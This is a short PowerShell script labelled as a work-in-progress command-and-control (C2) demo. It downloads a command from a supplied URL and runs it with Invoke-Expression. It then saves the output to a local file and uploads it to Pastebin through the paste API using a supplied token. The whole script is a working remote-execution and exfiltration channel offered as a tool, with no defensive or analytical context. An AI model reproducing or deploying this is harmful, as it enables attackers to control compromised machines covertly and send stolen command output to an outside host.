####################################################################################################
#
# C2 DEMO script __WIP__
#
####################################################################################################

Param(
    [Parameter(Mandatory=$true)]
    [string]$PB_token,
    [Parameter(Mandatory=$true)]
    [string]$cmd_source
)

$BASEDIR = pwd
$cmd = Invoke-webrequest -URI "$cmd_source"
Write-Host "Test command " + $cmd

if ( "$cmd" -eq 'NOP')
{
    Write-Host $cmd
}
else
{
    $content = Invoke-Expression $cmd
    Write-Host $content
    $content | Out-File -FilePath "$BASEDIR\pastebin-output.txt"

    # set args
    $apiKey = "$PB_token"
    $pasteContent = "$content"
    $response = Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -Method POST -Body @{'api_dev_key'=$apiKey; 'api_option'='paste'; 'api_paste_code'=$pasteContent}
    $response.content
}